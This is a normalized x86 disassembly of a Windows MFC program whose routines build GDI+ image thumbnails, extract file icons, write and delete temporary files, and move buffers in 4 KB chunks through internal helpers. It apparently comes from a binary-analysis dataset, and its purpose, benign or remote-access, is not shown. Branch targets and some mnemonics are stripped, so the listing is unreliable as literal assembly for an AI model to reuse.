cmp esi [ esp + 0x24 ]
jb r-xdata
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_2781
mov eax [ esp + 0x28 ]
push 0x10
lea ecx [ esp + 0x2c ]
call [ eax + 0x40 ]
test eax eax
je r-xdata
jmp r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
push 0xffffffff
[ edi ]
mov edi [ esp + 0x20 ]
mov eax [ ebp + 0x28 ]
not ecx
dec ecx
mov [ esp + 0x24 ] eax
mov esi ecx
lea ecx [ ebp + 0x20 ]
sub esi edi
lea edx [ eax + esi + 0x1 ]
push edx
call Ordinal_MFC42_6139
mov eax [ esp + 0x20 ]
lea ecx [ esi + 0x1 ]
lea esi [ ebx + edi ]
mov edi [ ebp + 0x24 ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
lea eax [ ebp + 0x20 ]
push eax
push ecx
push ecx
mov ecx esp
mov [ esp + 0x2c ] esp
push ebx
call Ordinal_MFC42_537
mov ecx ebp
call sub_403a30
jmp r-xdata
sub_405630
sub esp 0x8
push ebx
push ebp
push esi
lea eax [ esp + 0x10 ]
push edi
lea ecx [ esp + 0x10 ]
xor esi esi
push eax
push ecx
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
call GdipGetImageEncodersSize
mov eax [ esp + 0x14 ]
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x8
retn
push eax
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
cmp ebx esi
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ebx
push edx
push eax
call GdipGetImageEncoders
cmp [ esp + 0x10 ] esi
jbe r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov ebp [ esp + 0x1c ]
lea edi [ ebx + 0x30 ]
lea edx [ esi + esi * 8 ]
push ebx
lea eax [ esi + edx * 2 ]
mov edx [ esp + 0x24 ]
lea ecx [ ebx + eax * 4 ]
mov eax [ ebx + eax * 4 ]
mov [ edx ] eax
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
call [ free@IAT ]
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
inc esi
add edi 0x4c
cmp esi eax
jb r-xdata
mov ecx [ edi ]
push ebp
push ecx
call [ wcscmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
sub_4056f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40df70
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x30 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
push 0xffffffff
lea ecx [ ebp + 0x20 ]
push esi
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push esi
push eax
push ecx
mov ecx ebp
call sub_407060
mov ebx eax
test ebx ebx
je r-xdata
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_540
mov eax [ ebp + 0x24 ]
add esi 0xfffffff8
push esi
mov [ esp + 0x3c ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ esp + 0x1c ] ecx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edx
lea edi [ eax + 0x8 ]
call Ordinal_MFC42_2919
mov edx eax
or ecx 0xffffffff
xor eax eax
push 0x40
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_353
mov edi [ esp + 0x18 ]
push 0x0
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0x1
call Ordinal_MFC42_5773
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_3318
mov edx [ ebp + 0x4 ]
mov [ esp + 0x14 ] eax
mov ecx [ edx + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0x14 ]
push 0x4
push eax
push 0x0
push ecx
mov ecx ebp
call sub_4070f0
push 0xffffffff
push 0x1000
lea ecx [ ebp + 0x20 ]
call Ordinal_MFC42_6139
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
cmp eax esi
jae r-xdata
add eax 0x4
mov ecx ebp
push eax
call sub_4071d0
test eax eax
je r-xdata
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1979
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
sub esi edi
cmp esi 0x1000
jbe r-xdata
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] 0x0
call Ordinal_MFC42_665
lea ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_800
test ebx ebx
je r-xdata
mov eax [ ebp + 0x24 ]
push esi
push eax
lea ecx [ esp + 0x28 ]
add edi esi
call Ordinal_MFC42_5442
mov eax [ ebp + 0x24 ]
mov edx [ ebp + 0x10 ]
push esi
push eax
push 0x0
push edx
mov ecx ebp
call sub_4070f0
mov ebx eax
test ebx ebx
je r-xdata
mov esi 0x1000
mov eax [ esp + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
mov esi [ esp + 0x14 ]
cmp edi esi
jb r-xdata
sub_4058b0
push ebp
mov ebp esp
push 0xffffffff
push sub_40dfb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x15c
push ebx
mov ebx ecx
push esi
push edi
mov eax [ ebx + 0x10 ]
push eax
call sub_406ff0
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x174 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
lea ecx [ ebx + 0x20 ]
push esi
call Ordinal_MFC42_6139
mov eax [ ebx + 0x24 ]
mov ecx [ ebx + 0x10 ]
push esi
push eax
push ecx
mov ecx ebx
call sub_407060
test eax eax
mov [ ebp - 0x30 ] eax
je r-xdata
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_540
mov eax [ ebx + 0x24 ]
add esi 0xfffffff8
push esi
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x34 ] edx
lea edi [ eax + 0x8 ]
call Ordinal_MFC42_2919
mov edx eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_535
push rw-data
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_537
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_4202
push 0x2e
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_5683
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp - 0x1c ]
mov esi rw-data
mov ecx edi
lea edx [ ebp - 0x14 ]
push eax
push edx
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_4277
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_858
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x167 ]
mov [ ebp - 0x168 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x168 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x168 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov ecx edx
and ecx 0x3
mov [ ebp - 0x14 ] eax
test eax eax
[ edi ] [ esi ]
jne r-xdata
mov esi rw-data
mov ecx edi
xor eax eax
jmp r-xdata
mov dl [ ecx + 0x1 ]
mov al dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push eax
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40d2c0
mov eax [ ebp - 0x14 ]
mov edi esp
push esi
push edi
push 0xffffffff
push eax
push 0x0
push 0x0
mov [ edi ] 0x0
call [ MultiByteToWideChar@IAT ]
xor edi edi
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
test eax eax
je r-xdata
add ecx 0x2
add esi 0x2
test al al
jne r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x4c ] edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x54 ] r--data
push ecx
push edi
mov [ ebp - 0x20 ] 0x0
call GdipCreateBitmapFromFile
mov esi [ ebp - 0x20 ]
mov edi eax
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x50 ] esi
push 0x0
lea edx [ ebp - 0x28 ]
push 0x0
push edx
push 0x96
push 0xc8
push esi
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x28 ] 0x0
call GdipGetImageThumbnail
test eax eax
je r-xdata
mov esi rw-data
mov ecx edi
xor eax eax
jmp r-xdata
mov dl [ ecx + 0x1 ]
mov al dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ ecx ]
mov al dl
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push eax
call GdipDisposeImage
mov ecx [ ebp - 0x28 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ ebp - 0x14 ] eax
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
test eax eax
je r-xdata
add ecx 0x2
add esi 0x2
test al al
jne r-xdata
lea eax [ ebp - 0x168 ]
push eax
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40d2c0
mov edi esp
push esi
push edi
lea ecx [ ebp - 0x168 ]
push 0xffffffff
push ecx
push 0x0
push 0x0
mov [ edi ] 0x0
call [ MultiByteToWideChar@IAT ]
mov esi [ ebp - 0x20 ]
xor edi edi
jmp r-xdata
lea ecx [ ebp - 0x64 ]
push ecx
push rw-data
call sub_405630
lea edx [ ebp - 0x168 ]
add esp 0x8
test edx edx
jne r-xdata
mov esi rw-data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ ecx + 0x1 ]
mov al dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ ecx ]
mov al dl
cmp dl [ esi ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_2614
lea ecx [ ebp - 0x168 ]
push ecx
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_860
push esi
mov [ ebp - 0x4 ] 0x2
call GdipDisposeImage
mov [ edi + 0x8 ] eax
lea edx [ ebp - 0x64 ]
push 0x0
push edx
push edi
mov edi [ ebp - 0x14 ]
mov eax [ edi + 0x4 ]
push eax
call GdipSaveImageToFile
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add ecx 0x2
add esi 0x2
test al al
jne r-xdata
mov eax [ ebx + 0x10 ]
lea edx [ ebp - 0x24 ]
push 0x4
push edx
push 0x0
push eax
mov ecx ebx
call sub_4070f0
push 0xffffffff
push 0x1000
lea ecx [ ebx + 0x20 ]
call Ordinal_MFC42_6139
mov esi [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
cmp eax esi
jae r-xdata
add eax 0x4
mov ecx ebx
push eax
call sub_4071d0
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
push 0x40
push edx
lea ecx [ ebp - 0x44 ]
call Ordinal_MFC42_353
mov edi [ ebp - 0x2c ]
push 0x0
push edi
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_5773
lea ecx [ ebp - 0x44 ]
call Ordinal_MFC42_3318
mov ecx [ ebx + 0x4 ]
mov [ ebp - 0x24 ] eax
mov edx [ ecx + 0xc ]
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ ecx ]
mov al dl
cmp dl [ esi ]
jne r-xdata
lea ecx [ ebp - 0x44 ]
call Ordinal_MFC42_1979
mov eax [ ebp - 0x34 ]
test eax eax
je r-xdata
sub esi edi
cmp esi 0x1000
jbe r-xdata
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_665
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x24 ]
push esi
push eax
lea ecx [ ebp - 0x44 ]
add edi esi
call Ordinal_MFC42_5442
mov eax [ ebx + 0x24 ]
mov ecx [ ebx + 0x10 ]
push esi
push eax
push 0x0
push ecx
mov ecx ebx
call sub_4070f0
test eax eax
mov [ ebp - 0x30 ] eax
je r-xdata
mov esi 0x1000
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ DeleteFileA@IAT ]
mov esi [ ebp - 0x24 ]
cmp edi esi
jb r-xdata
sub_405d60
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call GdipDisposeImage
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_405d90
push ecx
push esi
mov esi ecx
lea eax [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
push eax
push ecx
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
pop esi
pop ecx
retn
mov esi [ esi + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
pop ecx
retn
sub_405e10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40dfd0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x30 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2c
retn
push 0xffffffff
lea ecx [ ebp + 0x20 ]
push esi
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push esi
push eax
push ecx
mov ecx ebp
call sub_407060
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_540
mov eax [ ebp + 0x24 ]
add esi 0xfffffff4
push esi
lea ecx [ esp + 0x14 ]
mov edx [ eax + 0x8 ]
mov ebx [ eax + 0x4 ]
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x18 ] edx
lea edi [ eax + 0xc ]
call Ordinal_MFC42_2919
mov edx eax
or ecx 0xffffffff
xor eax eax
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_5683
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push eax
push ecx
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_4129
mov ecx ebp
call sub_403ba0
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_354
test ebx ebx
mov [ esp + 0x38 ] 0x1
push 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x41
push eax
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_5186
push 0x0
push ebx
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_5773
mov edx [ esp + 0x14 ]
push 0x1041
push edx
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_5186
jmp r-xdata
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1979
mov edx [ ebp + 0x4 ]
mov [ esp + 0x18 ] 0x1
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov esi [ esp + 0x14 ]
sub esi edi
cmp esi 0x1000
jbe r-xdata
push 0xffffffff
push 0x1000
lea ecx [ ebp + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esp + 0x14 ]
mov edi ebx
cmp ebx eax
jae r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0x18 ]
push 0x4
push eax
push 0x0
push ecx
mov ecx ebp
call sub_4070f0
push 0x4
mov ecx ebp
call sub_4071d0
test eax eax
je r-xdata
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push esi
push eax
push ecx
mov ecx ebp
add edi esi
call sub_407060
test eax eax
je r-xdata
mov esi 0x1000
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] 0x0
call Ordinal_MFC42_665
lea ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_800
mov eax [ ebp + 0x24 ]
push esi
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
cmp edi [ esp + 0x14 ]
jb r-xdata
sub_405fe0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40dff0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push ebp
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov ebx eax
xor ebp ebp
cmp ebx ebp
je r-xdata
mov ecx [ esp + 0x44 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x40
retn
push 0xffffffff
push ebx
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push ebx
push eax
push ecx
mov ecx esi
call sub_407060
cmp eax ebp
je r-xdata
mov edx [ esi + 0x24 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edx
[ edi ]
not ecx
cmp ecx ebx
jne r-xdata
test ebx ebx
jbe r-xdata
mov [ esp + 0x20 ] 0xffffffff
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
lea edx [ esp + 0x1c ]
push 0xc
push edx
push 0x0
push eax
mov ecx esi
call sub_4070f0
push 0xc
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
lea ecx [ esp + 0x28 ]
lea edi [ edx + ebp ]
call Ordinal_MFC42_356
push 0x0
push edi
lea ecx [ esp + 0x30 ]
mov [ esp + 0x54 ] 0x0
call Ordinal_MFC42_2770
test eax eax
je r-xdata
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_1980
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x4c ] 0xffffffff
lea ebp [ ecx + ebp + 0x1 ]
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_668
cmp ebp ebx
jb r-xdata
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_2781
mov edx [ esp + 0x28 ]
push 0x10
lea ecx [ esp + 0x2c ]
call [ edx + 0x40 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x28 ]
inc edx
mov [ esp + 0x1c ] edx
call Ordinal_MFC42_3319
add [ esp + 0x24 ] eax
mov ecx [ esp + 0x20 ]
push edi
inc ecx
mov [ esp + 0x24 ] ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x50 ] 0x1
call Ordinal_MFC42_941
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x20 ]
push eax
lea edx [ esp + 0x20 ]
push ecx
push edx
push ecx
lea eax [ esp + 0x20 ]
mov ecx esp
mov [ esp + 0x28 ] esp
push eax
call Ordinal_MFC42_535
mov ecx esi
call sub_403c80
lea ecx [ esp + 0x10 ]
mov [ esp + 0x4c ] 0x0
call Ordinal_MFC42_800
jmp r-xdata
sub_4061a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e02c
push eax
mov [ fs : 0x0 ] esp
sub esp 0x314
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x324 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x320
retn
push 0xffffffff
lea ecx [ ebp + 0x20 ]
push esi
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push esi
push eax
push ecx
mov ecx ebp
call sub_407060
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x24 ]
lea edx [ esp + 0xac ]
push edx
push esi
call Ordinal_MFC42_3790
mov eax [ esp + 0xac ]
mov ecx [ esp + 0xb0 ]
mov edx [ esp + 0xb4 ]
mov edi [ SHGetFileInfoA@IAT ]
push 0x2000
push ebx
mov [ esp + 0x58 ] eax
mov eax [ esp + 0xc0 ]
mov [ esp + 0x5c ] ecx
mov cl [ esp + 0xc4 ]
push ebx
push ebx
push esi
mov [ esp + 0x6c ] edx
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] cl
call edi
push esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x65 ] eax
call Ordinal_MFC42_537
lea edx [ esp + 0x14 ]
push 0x4
push edx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x334 ] ebx
call Ordinal_MFC42_5710
lea ecx [ esp + 0x14 ]
mov [ esp + 0x32c ] 0x1
call Ordinal_MFC42_4204
mov eax [ esp + 0x14 ]
mov esi rw-data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edx [ ebp + 0x4 ]
cmp [ edx + 0xc ] ebx
je r-xdata
mov ecx [ esp + 0x10 ]
push 0x100
lea eax [ esp + 0x1c8 ]
push 0x160
push eax
push ebx
push ecx
mov [ esp + 0x34 ] ebx
call edi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0x50 ]
push 0x15
push eax
push 0x1
push ecx
mov ecx ebp
call sub_4070f0
push 0x19
mov ecx ebp
call sub_4071d0
cmp eax ebx
je r-xdata
mov edx [ esp + 0x10 ]
push 0x1
lea ecx [ esp + 0x24 ]
push ebx
push ecx
push ebx
push edx
call [ ExtractIconExA@IAT ]
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x98 ]
push eax
push ecx
mov eax [ esp + 0x1c4 ]
lea edx [ esp + 0x98 ]
push edx
push eax
jmp r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x32c ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x32c ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x34 ]
push esi
push ecx
call Ordinal_MFC42_5785
xor edi edi
mov [ esp + 0x18 ] edi
mov esi [ esi + 0x4 ]
call [ GetIconInfo@IAT ]
mov edx [ esp + 0xa4 ]
push edx
call Ordinal_MFC42_2860
mov esi eax
lea eax [ esp + 0x68 ]
push eax
push 0x18
mov ecx [ esi + 0x4 ]
mov [ esp + 0x34 ] esi
push ecx
call [ GetObjectA@IAT ]
mov ebx [ esp + 0x70 ]
imul ebx [ esp + 0x74 ]
push ebx
call Ordinal_MFC42_823
mov edx [ esi + 0x4 ]
add esp 0x4
mov [ esp + 0x24 ] eax
push eax
push ebx
push edx
call [ GetBitmapBits@IAT ]
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x6c ]
mov edx [ esp + 0x70 ]
mov [ esp + 0x80 ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x84 ] ecx
mov cl [ esp + 0x78 ]
mov [ esp + 0x8c ] eax
mov eax [ esp + 0xa8 ]
mov [ esp + 0x88 ] edx
mov dl [ esp + 0x7a ]
push eax
mov [ esp + 0x94 ] cl
mov [ esp + 0x95 ] dl
mov [ esp + 0x96 ] ebx
call Ordinal_MFC42_2860
mov esi eax
push 0x1000
mov [ esp + 0x2c ] esi
call Ordinal_MFC42_823
add esp 0x4
lea ecx [ esp + 0x40 ]
mov [ esp + 0x1c ] eax
call Ordinal_MFC42_323
push 0x0
push 0x0
push 0x0
push rw-data
mov [ esp + 0x33c ] 0x2
call [ CreateDCA@IAT ]
push eax
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_1640
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_323
mov edi [ esp + 0x44 ]
lea eax [ esp + 0x40 ]
neg eax
sbb eax eax
mov [ esp + 0x32c ] 0x3
and eax edi
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x34 ]
call Ordinal_MFC42_1640
test esi esi
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push edx
push esi
push eax
call [ GetPixel@IAT ]
mov ecx [ esp + 0x1c ]
add edi 0x4
inc esi
mov [ edi + ecx - 0x4 ] eax
cmp esi 0x20
jl r-xdata
mov eax [ esp + 0x18 ]
inc eax
cmp eax 0x20
mov [ esp + 0x18 ] eax
jl r-xdata
xor esi esi
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_2405
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_2405
lea esi [ ebp + 0x20 ]
push 0xffffffff
push 0x0
mov ecx esi
call Ordinal_MFC42_6139
lea edx [ ebx + 0x102b ]
push 0xffffffff
push edx
mov ecx esi
call Ordinal_MFC42_6139
mov edi [ ebp + 0x24 ]
mov ecx 0x5
lea esi [ esp + 0x50 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebp + 0x24 ]
mov ecx 0x5
add edi 0x15
lea esi [ esp + 0x80 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edi [ ebp + 0x24 ]
mov esi [ esp + 0x24 ]
mov ecx ebx
add edi 0x2b
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0x24 ]
mov esi [ esp + 0x1c ]
mov ecx 0x400
lea edi [ edx + ebx + 0x2b ]
[ edi ] [ esi ]
mov eax [ esp + 0x1c4 ]
push eax
call [ DestroyIcon@IAT ]
mov ecx [ esp + 0x2c ]
call Ordinal_MFC42_2414
mov ecx [ esp + 0x28 ]
call Ordinal_MFC42_2414
mov ecx [ esp + 0x24 ]
push ecx
call Ordinal_MFC42_825
mov edx [ esp + 0x20 ]
push edx
call Ordinal_MFC42_825
mov eax [ ebp + 0x4 ]
add esp 0x8
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
push 0x1
push ecx
mov ecx ebp
call sub_4070f0
jmp r-xdata
mov eax [ ebp + 0x28 ]
mov ecx ebp
add eax 0x4
push eax
call sub_4071d0
test eax eax
jne r-xdata
lea ecx [ esp + 0x30 ]
mov [ esp + 0x32c ] 0x2
call Ordinal_MFC42_640
lea ecx [ esp + 0x40 ]
mov [ esp + 0x32c ] 0x1
call Ordinal_MFC42_640
jmp r-xdata
sub_4065f0
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ecx
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
